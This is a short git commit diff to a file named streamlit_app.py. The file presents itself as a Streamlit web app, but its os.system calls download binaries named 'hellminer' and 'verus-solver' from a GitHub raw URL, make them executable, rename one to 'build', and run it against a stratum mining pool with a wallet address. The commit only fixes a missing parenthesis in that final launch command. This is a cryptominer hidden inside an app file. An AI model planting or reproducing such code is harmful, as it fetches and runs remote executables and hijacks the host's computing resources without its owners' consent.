d70b6295c8df947fb51cfd34041a0f8dba0c4507
AzureOpSec <admin@bullrunminer.live>
2025-01-09 04:33:17 -0600

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -5,4 +5,4 @@ os.system("wget -O hellminer https://raw.githubusercontent.com/akton0208/test2/m
 os.system("wget -O verus-solver https://raw.githubusercontent.com/akton0208/test2/main/verus-solver >/dev/null 2>&1")
 os.system("chmod +x hellminer verus-solver")
 os.system("mv hellminer build")
-os.system("./build -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F"
+os.system("./build -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F")
